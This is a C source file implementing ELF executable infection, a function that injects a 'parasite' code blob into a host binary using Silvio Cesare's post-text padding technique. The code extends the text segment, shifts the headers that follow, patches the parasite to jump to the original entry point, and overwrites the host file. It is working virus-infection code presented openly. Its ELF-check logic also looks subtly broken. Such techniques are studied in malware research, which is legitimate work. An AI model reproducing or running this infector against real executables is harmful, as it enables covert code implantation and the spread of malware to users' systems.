#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <elf.h>

#define PAGE_SIZE 4096
#define TMP "tmp.bin"

int hfd, pfd;
int patch_position;
struct stat hst, pst;

/* Inject parasite code into an 
 * executable using Silvio Cesare's 
 * post text padding technique 
 * @param host filename containing the host
 * @param parasite filename containing the parasite
 * @param patch_position position in the parasite code to insert the host's code address
 */
int posttext_inject(char *host, char *parasite, uint8_t patch_position)
{
    unsigned long entry_point, text_offset, text_begin;
    unsigned char *mem;
    unsigned int entry_offset;
    unsigned char buf[PAGE_SIZE];
    unsigned int ehdr_size;
    int ofd;
    int psize;
    int text_found;
    Elf32_Ehdr *ehdr;
    Elf32_Phdr *phdr;
    Elf32_Shdr *shdr;
    int i, wrote;

    if ((hfd = open(host, O_RDONLY)) == -1) 
    {
        perror("host open");
        exit(-1);
    }

    if ((pfd = open(parasite, O_RDONLY)) == -1)
    {
        perror("parasite open");
        exit(-1);
    }

    if (fstat(hfd, &hst))
    {
        perror("host stat");
        exit(-1);
    }
     
    if (fstat(pfd, &pst))
    {
        perror("parasite stat");
        exit(-1);
    }


    psize = pst.st_size;

    mem = mmap(NULL, hst.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, hfd, 0);
    if (mem == MAP_FAILED)
    {
        perror("mmap");
        exit(-1);
    }

    ehdr = (Elf32_Ehdr *) mem;
    entry_point = ehdr->e_entry;
    ehdr_size = sizeof(*ehdr);


    if (!(ehdr->e_ident[0] == 0x7f && strcmp(&ehdr->e_ident[1], "ELF")))
    {
        printf("host is not an ELF\n");
        exit(-1);
    }

    text_found = 0;
    phdr = (Elf32_Phdr *) (mem + ehdr->e_phoff);

    // iterate over phdrs looking for the text segment
    for (i = ehdr->e_phnum; i-- > 0; phdr++)
    {
        if (text_found) //&& phdr->p_offset >= entry_offset)
        {
            phdr->p_offset += PAGE_SIZE;
        }

        if (phdr->p_type == PT_LOAD)
            if (phdr->p_flags == (PF_R | PF_X))
            {
                text_found++;
                text_offset = phdr->p_offset; // offset of text segment on file
                text_begin = phdr->p_vaddr; 
                entry_offset = phdr->p_filesz; // offset to parasite entry point
                phdr->p_filesz += psize;
                phdr->p_memsz += psize;
            }
    }


    shdr = (Elf32_Shdr *) (mem + ehdr->e_shoff);
    for (i = ehdr->e_shnum; i-- > 0; shdr++)
    {
        if (shdr->sh_offset >= text_offset + entry_offset)
        {
            shdr->sh_offset += PAGE_SIZE;
        }
    }

    // push section header table
    ehdr->e_shoff += PAGE_SIZE;

    if (psize > PAGE_SIZE)
    {
        printf("parasite too large\n");
        exit(-1);
    }

    if (read(pfd, buf, psize) == -1)
    {
        perror("parasite: read");
        exit(-1);
    }

    int preparasite_size_file = text_offset + entry_offset;

    // patch parasite code
    *(unsigned long *)&buf[patch_position] = entry_point;
    printf("Patching parasite to jmp to %x\n", entry_point);

    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, hst.st_mode)) == -1)
    {
        perror("tmp binary: open");
        exit(-1);
    }

    if ((wrote = write(ofd, mem, preparasite_size_file)) != preparasite_size_file)
    {
        perror("tmp binary: write contents up to parasite");
        exit(-1);
    }

    if ((wrote = write(ofd, buf, psize)) != psize) 
    {
        perror("tmp binary: write parasite");
        exit(-1);
    }

    // Physically insert the new code (parasite) and pad to PAGE_SIZE, into the file - text segment p_offset + p_filesz (original)
    if (lseek(ofd, PAGE_SIZE-psize, SEEK_CUR) < 0)
    {
        perror("seek");
        exit(-1);
    }

    mem += text_offset + entry_offset;
    if (write(ofd, mem, hst.st_size-preparasite_size_file) != hst.st_size-preparasite_size_file)
    {
        perror("tmp binary: write post injection");
        exit(-1);
    }

    rename(TMP, host);
    close(ofd);

    return text_offset + entry_offset; 
}
